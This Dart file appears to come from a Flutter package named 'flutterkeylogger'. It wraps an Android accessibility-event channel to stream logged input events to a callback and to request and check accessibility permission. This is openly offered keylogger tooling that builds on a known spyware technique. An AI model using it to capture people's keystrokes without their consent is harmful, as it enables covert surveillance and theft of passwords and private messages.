part of flutterkeylogger;

class Keylogger {
  Keylogger._();

  static const _eventChannel = EventChannel("keylogger/accessibility_event");
  static const _methodChannel = MethodChannel("keylogger/accessibility_channel");
  
  ///logs all events from the broadcast stream. provides [onData] handler which returns the log Object
  static void logs(Function onData) {
    _eventChannel.receiveBroadcastStream().listen(
      (event) {
        onData(Log._fromMap(event));
      },
      cancelOnError: true,
    );
  }

  /// request accessibility permission. 
  /// It will open the accessibility settings page and return `true` once the permission is granted.
  static Future<bool> requestAccessibilityPermission() async {
    try {
      return await _methodChannel.invokeMethod('requestAccessibilityPermission');
    } on PlatformException catch (error) {
      print("$error");
      return Future.value(false);
    }
  }

  /// Checks if accessibility permession is enabled
  static Future<bool> isAccessibilityPermissionEnabled() async {
    try {
      return await _methodChannel.invokeMethod('isAccessibilityPermissionEnabled');
    } on PlatformException catch (error) {
      print("$error");
      return false;
    }
  }
}
